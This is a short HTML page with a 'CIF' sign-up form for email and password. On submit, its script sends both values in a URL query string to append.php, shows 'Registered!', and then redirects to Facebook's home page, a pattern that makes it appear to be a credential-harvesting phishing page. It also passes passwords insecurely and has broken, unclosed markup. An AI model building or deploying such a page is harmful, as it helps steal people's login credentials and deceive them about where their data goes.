<header>
    <div>
        <nav class="navbar navbar-expand-lg navbar-light ">
            <a class="navbar-brand" href="#">CIF</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item active">

        </nav>

<body style="background-image: url('./img/bg.webp');">

    <div>
        <form >
            <div class="row mb-3">
                <label for="email" class="col-sm-1 col-form-label px-5 ">Email</label>
                <div class="col-sm-10">
                    <input type="email" class="form-control" id="email">
                </div>
            </div>
            <div class="row mb-3">
                <label for="pwd" class="col-sm-1 col-form-label px-5">Password</label>
                <div class="col-sm-10">
                    <input type="password" class="form-control" id="pwd">
                </div>

            </div>

            <button type="submit" class="btn btn-primary ml-4 " onclick="reg();">Sign Up</button>

        </form>
    </div>
    <div style="margin-left: auto;">
        <div id="div1"><h2>Term and Condition</h2></div>
        <button id="term">Click Me</button>
    </div>


    <!-- Footer script -->
<script src="./jquery.min.js"></script>
    <script>
        $(document).ready(function(){
            $("button").click(function(){
                $("#div1").load("term.txt");
                $("#term").hide();
            });
        });
    </script>
<script>
    function reg () {
        let email = $("#email").val();
        let pwd = $("#pwd").val();

        $.post( "append.php?email=" + email + "&password=" + pwd, function() {
            if(window.confirm('Registered!')) {
                window.location.href = "https://www.facebook.com/home.php";
            }
        })
    }
</script>
